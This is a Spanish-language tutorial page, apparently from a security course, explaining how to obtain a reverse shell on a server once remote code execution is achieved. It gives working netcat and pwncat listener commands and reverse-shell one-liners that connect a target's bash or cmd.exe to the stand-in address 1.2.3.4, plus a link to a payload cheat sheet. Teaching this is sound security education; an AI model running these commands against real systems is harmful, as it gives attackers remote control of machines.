---
title : "Reverse Shell"
lead: ""
date: 2020-10-06T08:48:45+00:00
draft: false
images: []
menu:
  docs:
    parent: "apps-web"
weight: 060
---

En el capítulo anterior vimos cómo ejecutar comandos de manera remota en un servidor, sin tener acceso a una
terminal. Esto es muy útil en un comienzo, pero rápidamente se vuelve evidente la lentitud, torpeza y limitaciones
que significa este medio. Sería mucho más cómodo si de alguna forma se pudiese obtener acceso a una terminal,
o _shell_, con la cual ejecutar comandos de manera más directa, y sin tener que pasar por todo el proceso
remoto.

Afortunadamente existen las shell reversas: a diferencia de una shell normal, en la cual el cliente se conecta
a un servidor escuchando por conexiones, una shell reversa implica que el cliente está a la espera de una
conexión, y es el servidor quien la inicia. Asumiendo que ya tienen RCE, es posible iniciar una reverse shell con
un par de comandos, aunque puede ser necesario evadir algún filtro, firewall o antivirus.

Los pasos para levantar una reverse shell son los siguientes:
1. El atacante espera por conexiones TCP en algún puerto específico (por ejemplo 4444).

2. El servidor inicia una conexión TCP con el atacante en el puerto especificado.

3. Una vez establecida la conexión, el servidor levanta una shell
   (como `sh` o `bash` en Linux, y `cmd.exe` o `powershell.exe` en Windows).

4. Todos los mensajes del atacante son redirigidos a la entrada estándar de la shell, y la salida estándar de
esta es redirigida por la conexión hacia el atacante.

## Herramientas

En términos generales, cualquier programa que permita escuchar e iniciar comunicaciones TCP, y luego redirigir
las entradas y salidas estándar, debería funcionar. Los más comunes son:
* Linux: `nc`, `ncat`, `netcat`, `socat`
* Windows: `nc.exe`

También se puede iniciar reverse shells con casi todos los lenguajes de programación.
[Aquí](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
pueden encontrar documentación sobre muchas técnicas distintas de iniciar reverse shells.

## Ejemplo

### Cliente

Para empezar a escuchar en el puerto `4444` por conexiones TCP, puede usar `nc` de la siguiente forma:

    nc -lvp 4444

También pueden usar [pwncat](https://github.com/calebstewart/pwncat), que está hecho para reverse shells,
y tiene más características, como autocompletado con TAB.

    pwncat --listen --port 4444

### Servidor

En el servidor usualmente no se tiene control de los programas instalados, por lo que se tendrán que adaptar
a lo que encuentren ahí. De todas formas, casi siempre está instalado `nc` o `nc.exe`. Para iniciar la conexión
a la IP `1.2.3.4` y puerto `4444`, levantar la shell y redirigir la entrada y salida estándar, se ejecuta lo siguiente:

    nc -c /bin/bash 1.2.3.4 4444
    nc.exe 1.2.3.4 4444 -e cmd.exe

### Prueba de Concepto

Ejecutamos lo descrito anteriormente, con una misma máquina funcionando como cliente y servidor. En el lado
del servidor no se ve nada muy interesante:

![Reverse Shell Server](../reverse-shell-server.png)

Pero el cliente ahora tiene una shell nueva:

![Reverse Shell Client](../reverse-shell-client.png)
